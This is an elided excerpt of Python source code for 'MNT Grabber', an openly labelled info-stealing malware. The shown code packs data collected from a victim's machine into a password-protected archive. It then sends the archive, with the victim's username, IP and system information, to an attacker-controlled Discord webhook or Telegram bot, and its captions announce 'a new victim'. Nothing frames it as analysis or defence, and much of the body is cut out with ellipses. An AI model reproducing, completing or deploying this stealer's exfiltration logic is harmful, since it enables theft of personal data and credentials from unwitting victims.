# Python 3.10+
# Author: MNT-W
# Github: https://github.com/MNT-W/MNT-Grabber
# Encoding: UTF-8
...
Logger = logging.getLogger("MNT Grabber")
...
class MNT Grabber:
    ...
    def CreateArchive(self) -> tuple[str, str]: # Create archive of the data collected
        ...
        if Utility.GetSelf()[1] or os.path.isfile(rarPath):
            ...
            if os.path.isfile(rarPath):
                password = Settings.ArchivePassword or "mnt123"
    ...
    def SendData(self) -> None: # Sends data to the webhook
        ...
        filename = "MNT-%s.%s" % (os.getlogin(), extention)
        ...
        match Settings.C2[0]:
            case 0: # Discord Webhook
                image_url = "https://raw.githubusercontent.com/MNT-W/MNT-Grabber/main/.github/workflows/image.png"
                    ...
                    "embeds": [
                        {
                            ...
                            "url": "https://github.com/MNT-W/MNT-Grabber",
                            "color": 34303,
                            "footer": {
                                "text": "Grabbed by MNT Grabber ; Stingerea | https://github.com/MNT-W/MNT-Grabber"
                            },
                            "thumbnail": {
                                "url": image_url
                            }
            ...
            case 1: # Telegram Bot
                payload = {
                    'caption': f'<b>MNT Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 
                    'parse_mode': 'HTML'
                }
